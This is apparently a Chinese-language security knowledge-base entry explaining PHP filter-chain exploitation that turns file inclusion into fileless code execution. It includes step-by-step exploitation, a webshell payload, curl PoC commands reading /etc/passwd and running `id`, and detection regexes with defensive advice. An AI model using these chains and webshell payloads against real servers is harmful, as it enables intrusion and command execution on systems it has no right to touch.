---
id: web-php-file-inclusion-filter-chain-fileless-rce
title: PHP Filter Chain 从空流生成任意字节实现无文件包含 RCE
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-filter-chain-rce
aliases:
- PHP Filter Chain
- php://filter 无文件 RCE
- LFI 升级 RCE
- convert.iconv 链
- php_filter_chain_generator
tags:
- php
- lfi
- file-inclusion
- filter-chain
- rce
- iconv
- base64
- fileless
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:36:27+08:00'
  notes: 已对照原文与 24 张图核对：CSISO2022KR 空流注入 1b242943、base64-encode→UTF7→base64-decode 提纯、生成器 HELLO/webshell 链、curl 执行 id 与 cat /etc/os-release、eval 链反弹 shell 均与原图一致；php:8.1-apache 为测试环境版本，非受影响区间；实现坑点与防御建议准确
---

## 一句话结论

当 `include($_GET['page'])` 这类 LFI 允许传入 `php://filter/...` 时，攻击者可用 `convert.iconv` 的确定性编码副作用不断“注入已知字节”，再用 `convert.base64-decode` 静默丢弃非 Base64 字符做“提纯”，在内存里凭空拼出 `<?php ... ?>` 并交给 include 执行，无需上传或写入任何文件。

## 原理

- `php://filter` 是元包装器，`read=<filter_list>/resource=<stream>` 把数据依次穿过过滤器；资源可以是空的 `php://temp`，因此输出完全由过滤器链决定。
- 种子注入：`convert.iconv.UTF-8.CSISO2022KR` 对空输入会确定性输出 ISO-2022-KR 指示序列 `\x1b$)C`（hex `1b 24 29 43`），其中 `C` 是合法 Base64 字符；UTF-16/UTF-32 会注入 BOM 字节（`\xff\xfe`、`\xff\xfe\x00\x00`），UTF-7 可把 `=` 变成 `+AD0-`。
- 筛选：`convert.base64-decode` 会忽略所有不在 `A-Za-z0-9+/=` 中的字节，包括 `\x1b`、`$`、`)` 等注入噪声，只留下需要的 Base64 字符。
- 迭代：每个单元先 `base64-encode` 保护已生成内容，再注入含目标字符的杂乱字节，再 `base64-decode` 提纯；重复累积出完整 Base64 编码的 PHP payload，最后解码为代码。
- 之所以成立：编码转换的副作用是确定性的，而解码器的容错性（忽略非法字符）被用作“过滤器”；二者组合把“读文件”变成了“在内存中构造任意字节”。整个过程不落盘，绕过文件写入监控。

## 触发条件

- 存在文件包含且用户可控参数进入 `include`/`require`（如 `include($_GET['page'])`）；
- `allow_url_include` 可以关闭，本技术不依赖远程包含；PHP 需支持 `convert.iconv` 过滤器（常见发行版默认支持）；
- 参数未被协议白名单阻断（`php://` 可用）；
- PHP 版本/iconv 实现对相关编码对的支持与工具生成链匹配（不同环境需实测微调）。

## 利用步骤

1. 确认 LFI 并验证 `php://filter/convert.base64-encode/resource=/etc/passwd` 可回显。
2. 用 `php_filter_chain_generator` 生成目标 PHP 代码对应的 filter chain（工具会输出一条极长的 `php://filter/...`）。
3. 将整条链作为 `page` 参数传入，URL 编码；链末尾的 `convert.base64-decode` 把构造出的 Base64 还原为 `<?php ... ?>`，include 执行。
4. 若需要命令执行，payload 用 `<?php system($_GET["cmd"]);?>`；若需要交互，用 `<?php eval($_POST['cmd']);?>` 再反弹 shell。

## PoC

```bash
# 1. 验证 LFI
curl "http://target/?page=php://filter/convert.base64-encode/resource=/etc/passwd"

# 2. 生成 webshell 链（仅取最后一行）
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>' | tail -n 1)

# 3. 触发
curl -s -G "http://target/" --data-urlencode "page=${CHAIN}" --data-urlencode "cmd=id"
```

关键结构片段（示意，完整链由工具生成）：

```text
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|...|resource=php://temp
```

命令行本地验证（PHP CLI）：

```bash
CHAIN=$(python3 php_filter_chain_generator.py --chain "HELLO" | tail -n 1)
php -r "echo file_get_contents('$CHAIN');"
```

## 变体与关联

- 变体：`--rawbase64` 输出中间态 Base64，规避 include 时残留种子字节造成的乱码；结合 `phar://` 反序列化、SSRF 的 filter chain 利用；`data://` 被禁用时用本技术替代。
- 关联：[[web-php-file-inclusion-thinkphp-view-template]]（另一条可控路径进入 include 的链）；通用 LFI 见 `web/generic/file-inclusion`。
- 实现坑点：手工把两条单字符链直接拼接通常会失败——残留 iconv 控制字节与位偏移会打乱 Base64 的 3 字节/4 字符对齐；应使用生成器内部的补齐计算，不要手拼。
- 影响边界：需要 include 可控且 `php://filter` 未被阻断；若参数被强制加后缀、走白名单或协议被拦截，链不成立。

## 检测与防御

- 检测：请求参数同时出现 `php://filter`、`convert.iconv`、`convert.base64` 且长度异常；Suricata 规则匹配这三个 content；ModSecurity 对 `ARGS` 做 `php://filter.*convert\.iconv.*convert\.base64` 正则阻断；Nginx/Apache 在查询串层拦截。
- 防御：绝对避免 `include($_GET[...])`；使用静态白名单；校验前用 `realpath` 锚定目录；拦截 `^[a-z0-9+.-]+://` 协议头；`open_basedir`、`allow_url_include=Off`、`disable_functions` 缩小影响；注意 `str_replace('../','')` 对 filter chain 完全无效。
